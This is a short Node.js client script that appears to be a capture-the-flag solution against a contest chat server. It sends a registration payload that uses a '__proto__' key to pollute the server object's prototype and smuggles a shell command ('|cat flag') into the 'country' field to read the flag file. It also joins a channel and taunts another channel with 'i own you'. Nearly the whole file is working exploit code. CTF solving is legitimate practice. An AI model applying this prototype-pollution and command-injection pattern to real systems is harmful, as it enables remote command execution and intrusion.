const io = require('socket.io-client')
const socket = io.connect('https://chat.dctfq18.def.camp')

if(process.argv.length != 4) {
  console.log('name and channel missing')
   process.exit()
}
console.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])
var inputUser = {
  name: 'marin',
  // country() { return "No Man`s Land"; },
  __proto__: {
    country: 'arici',
  },
};

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

// const userStringified = JSON.stringify(inputUser);
const userStringified = `{"name":"marin","__proto__":{"country":"arici'|cat flag #'"}}`;
// console.log(JSON.stringify(inputUser));
// console.log(JSON.stringify(inputUser));
socket.emit('register', userStringified);
socket.emit('message', JSON.stringify({ msg: "hello" }));
socket.emit('join', process.argv[3]);//ps: you should keep your channels private
socket.emit('message', JSON.stringify({ channel: process.argv[3], msg: "hello channel" }));
socket.emit('message', JSON.stringify({ channel: "test", msg: "i own you" }));
